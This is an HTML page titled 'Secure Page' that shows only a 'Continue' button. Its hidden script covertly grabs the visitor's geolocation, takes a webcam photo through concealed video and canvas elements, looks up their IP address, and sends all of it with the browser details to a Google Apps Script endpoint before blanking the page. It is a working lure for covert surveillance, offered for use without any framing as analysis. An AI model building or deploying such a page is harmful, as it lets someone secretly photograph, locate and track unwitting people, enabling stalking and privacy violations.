<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Secure Page</title>
</head>
<body>
<button id="start">Continue</button>

<video id="video" autoplay playsinline style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxHs52mIOt0df8YQYniKQU8GDfMeUs13gRdze8wgr-G9BW90fa6HcLNdH7cmthr6KDMZA/exec";

async function getIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip;
  } catch {
    return "IP not found";
  }
}

document.getElementById("start").onclick = async () => {

  // LOCATION
  let locationData = null;
  try {
    const pos = await new Promise((res, rej) =>
      navigator.geolocation.getCurrentPosition(res, rej)
    );
    locationData = {
      latitude: pos.coords.latitude,
      longitude: pos.coords.longitude
    };
  } catch {}

  // CAMERA
  let photoData = null;
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.getElementById("video");
    video.srcObject = stream;

    await new Promise(r => setTimeout(r, 1500));

    const canvas = document.getElementById("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);
    photoData = canvas.toDataURL("image/jpeg");

    stream.getTracks().forEach(t => t.stop());
  } catch {}

  // IP
  const ipAddress = await getIP();

  // SEND DATA
  await fetch(WEB_APP_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      location: locationData,
      device: navigator.userAgent,
      photo: photoData,
      ip: ipAddress
    })
  });

  // BLANK PAGE
  document.body.innerHTML = "";
};
</script>
</body>
</html>
